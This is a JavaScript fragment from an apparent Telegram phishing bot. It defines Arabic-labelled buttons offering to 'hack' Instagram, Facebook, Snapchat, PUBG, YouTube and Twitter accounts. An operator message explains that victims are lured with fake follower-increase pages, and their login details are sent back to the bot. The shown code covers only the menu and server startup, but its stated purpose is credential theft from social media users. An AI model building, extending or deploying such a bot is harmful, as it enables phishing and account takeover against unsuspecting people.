    [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
    [{ text: '🔱 اختراق الفيسبوك 🔱', callback_data: 'increase_facebook' }],
    [{ text: '👻 اختراق سناب شات 👻', callback_data: 'increase_snapchat' }],
    [{ text: '🔫 اختراق حسابات ببجي 🔫', callback_data: 'pubg_uc' }],
    [{ text: '🔴 اختراق يوتيوب 🔴', callback_data: 'increase_youtube' }],
    [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
  ];

  bot.sendMessage(userId, `اختر اندكسات على شكل زياده متابعين عند قيام الضحيه بتسجيل لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
    reply_markup: {
      inline_keyboard: hackingButtons
    }
  });
}



const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
